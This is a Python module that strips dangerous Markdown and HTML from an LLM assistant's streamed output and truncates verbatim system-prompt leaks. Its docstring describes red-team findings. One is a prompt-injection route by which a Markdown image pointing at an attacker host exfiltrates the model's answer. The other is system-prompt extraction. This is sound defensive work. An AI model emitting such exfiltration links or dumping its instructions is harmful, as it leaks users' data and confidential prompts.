"""Output guard: the model's text is made safe to render before any client sees it.

Prompt injection can talk a model into writing things a renderer turns into an action. The two the
red team found (``evals/redteam.yaml``) are handled here, on the server, so every client (the web
UI, the CLI, a stored conversation reloaded later) gets the same safe text:

- **Zero-click exfiltration.** ``![x](https://attacker/?d=<answer>)`` makes any Markdown renderer
  fetch the URL, sending the answer with it. Images (inline, reference-style, HTML media tags) are
  replaced with ``(image removed)``. Links keep their URL only when it is the URL of a source the
  model was shown; any other link is reduced to its label.
- **System prompt leaks.** Text repeating ``window`` or more consecutive words of the system prompt
  is cut at the start of the repeat and replaced with :data:`LEAK_NOTICE`; the rest of the turn is
  dropped. A run of words that also occurs in a shown passage is not a leak (the prompt may
  describe the company in the corpus's own words).

Streaming: :class:`OutputGuard` holds back only what is still undecided, an opened ``[``, ``![``
or ``<`` waiting for its end, and the last ``window - 1`` words, so nothing unsafe is ever
emitted and the stream equals :func:`guard_text` on the whole text. The prompt itself is the first
line of defence (see ``agent/prompts/system.md``); this guard is the second, and it does not catch
a paraphrased leak.
"""

from __future__ import annotations

import re
from collections.abc import Callable, Iterable

IMAGE_PLACEHOLDER = "(image removed)"
LEAK_NOTICE = "[Removed: I can't share my instructions. Ask me about the documents instead.]"

# Consecutive words of the system prompt that count as a leak. Refusals legitimately echo a
# phrase of the prompt ("I couldn't find it in the documents this person can see" is 11 words),
# so this is set well above a phrase; a prompt dump is a far longer verbatim run.
WINDOW = 16
MAX_HOLD = 2000  # an opener this far back with no end is just text

_MEDIA = (
    "img|image|iframe|frame|script|style|object|embed|video|audio|source|picture|svg|link|meta|"
    "base|form|input"
)
_HTML = re.compile(rf"<\s*/?\s*(?:{_MEDIA})\b[^>]*>", re.IGNORECASE)
_IMG = re.compile(r"!\[([^\]\n]*)\]\(([^)\n]*)\)")
_IMG_REF = re.compile(r"!\[([^\]\n]*)\]\[([^\]\n]*)\]")
_IMG_DANGLING = re.compile(r"!\[[^\]\n]*\](?:\([^)\n]*)?$")
_LINK = re.compile(r"\[([^\]\n]*)\]\(\s*<?([^)\s>]*)>?(?:\s+[^)\n]*)?\)")
_REFDEF = re.compile(r"^[ \t]{0,3}\[[^\]\n]+\]:[ \t]*<?([^\s>]+)>?[^\n]*(?:\n|$)", re.MULTILINE)
_WORD = re.compile(r"[A-Za-z0-9]+")


def sanitize_markdown(text: str, allowed: Iterable[str] = ()) -> str:
    """``text`` with images and HTML media removed and links to unknown URLs reduced to labels."""
    allowed = set(allowed)
    text = _HTML.sub("", text)
    text = _IMG.sub(IMAGE_PLACEHOLDER, text)
    text = _IMG_REF.sub(IMAGE_PLACEHOLDER, text)
    text = _REFDEF.sub(lambda m: m.group(0) if m.group(1) in allowed else "", text)

    def link(m: re.Match[str]) -> str:
        return m.group(0) if m.group(2) in allowed else m.group(1)

    return _LINK.sub(link, text)


def _bracket_end(s: str, i: int) -> int | None:
    """Where the construct opened by ``s[i] == "["`` ends; ``None`` while it can't be told yet."""
    depth, j, n = 0, i, len(s)
    while j < n:
        if s[j] == "[":
            depth += 1
        elif s[j] == "]":
            depth -= 1
            if depth == 0:
                break
        elif s[j] == "\n" and j + 1 < n and s[j + 1] == "\n":
            return i + 1  # a blank line ends any link text: this "[" is plain text
        j += 1
    if j >= n:
        return None
    after = j + 1
    if after >= n:
        return None  # "[x]" then "(", "[" or ":" may follow
    nxt = s[after]
    if nxt in "([":
        close = ")" if nxt == "(" else "]"
        k = s.find(close, after)
        nl = s.find("\n", after)
        if k == -1:
            return None if nl == -1 else after
        return after if (nl != -1 and nl < k) else k + 1
    if nxt == ":":
        nl = s.find("\n", after)
        return None if nl == -1 else nl + 1
    return after


def _safe_cut(s: str) -> int:
    """How much of ``s`` can be sanitised now: up to the first construct still open."""
    i, n = 0, len(s)
    while i < n:
        c = s[i]
        if c == "!" and i == n - 1:
            return i  # may become "!["
        if c == "[":
            end = _bracket_end(s, i)
            if end is None:
                if n - i > MAX_HOLD:
                    i += 1
                    continue
                return i - 1 if i > 0 and s[i - 1] == "!" else i
            i = max(end, i + 1)
            continue
        if c == "<":
            j = s.find(">", i)
            if j == -1:
                if n - i > MAX_HOLD or "\n" in s[i:]:
                    i += 1
                    continue
                return i
            i = j + 1
            continue
        i += 1
    return n


def _words(text: str) -> list[str]:
    return [w.lower() for w in _WORD.findall(text)]


def _shingles(words: list[str], window: int) -> set[str]:
    return {" ".join(words[k : k + window]) for k in range(len(words) - window + 1)}


class OutputGuard:
    """Feed model text deltas in, get safe text out; call :meth:`finish` at the end of the turn.

    ``allowed_urls`` and ``passages`` are called when needed, so sources registered while the turn
    streams count.
    """

    def __init__(
        self,
        *,
        system: str = "",
        allowed_urls: Callable[[], Iterable[str]] = lambda: (),
        passages: Callable[[], Iterable[str]] = lambda: (),
        window: int = WINDOW,
    ) -> None:
        self._allowed_urls = allowed_urls
        self._passages = passages
        self.window = window
        self._prompt = _shingles(_words(system), window) if system else set()
        self._md = ""  # raw text not yet sanitised
        self._held = ""  # sanitised text not yet checked for a prompt leak
        self._checked = 0  # complete words in _held whose window has been checked
        self.fed = 0  # characters fed so far
        self.leaked = False

    @property
    def released(self) -> int:
        """Roughly how many of the fed characters have come out (or been dropped) so far."""
        return self.fed if self.leaked else self.fed - len(self._md) - len(self._held)

    def feed(self, delta: str) -> str:
        self.fed += len(delta)
        if self.leaked:
            return ""
        self._md += delta
        cut = _safe_cut(self._md)
        clean = sanitize_markdown(self._md[:cut], self._allowed_urls())
        self._md = self._md[cut:]
        return self._leak_check(clean, final=False)

    def finish(self) -> str:
        if self.leaked:
            return ""
        rest = _IMG_DANGLING.sub("", self._md)
        self._md = ""
        clean = sanitize_markdown(rest, self._allowed_urls())
        return self._leak_check(clean, final=True)

    def _is_leak(self, shingle: str) -> bool:
        if shingle not in self._prompt:
            return False
        shown = " " + " ".join(_words(" ".join(self._passages()))) + " "
        return f" {shingle} " not in shown

    def _leak_check(self, clean: str, *, final: bool) -> str:
        if not self._prompt:
            return clean
        self._held += clean
        spans = [(m.start(), m.group().lower()) for m in _WORD.finditer(self._held)]
        if spans and not final and spans[-1][0] + len(spans[-1][1]) == len(self._held):
            spans = spans[:-1]  # the last word may still be growing
        w = self.window
        for k in range(max(w - 1, self._checked), len(spans)):
            shingle = " ".join(word for _, word in spans[k - w + 1 : k + 1])
            if self._is_leak(shingle):
                self.leaked = True
                before = self._held[: spans[k - w + 1][0]]
                self._held = ""
                return f"{before.rstrip()}\n\n{LEAK_NOTICE}" if before.strip() else LEAK_NOTICE
        self._checked = len(spans)
        if final:
            out, self._held = self._held, ""
            return out
        if len(spans) < w - 1:
            return ""
        cut = spans[len(spans) - (w - 1)][0] if w > 1 else len(self._held)
        out, self._held = self._held[:cut], self._held[cut:]
        self._checked = w - 1
        return out


def guard_text(
    text: str,
    *,
    system: str = "",
    allowed_urls: Iterable[str] = (),
    passages: Iterable[str] = (),
) -> str:
    """:class:`OutputGuard` applied to a whole text at once."""
    urls, shown = list(allowed_urls), list(passages)
    g = OutputGuard(system=system, allowed_urls=lambda: urls, passages=lambda: shown)
    return g.feed(text) + g.finish()
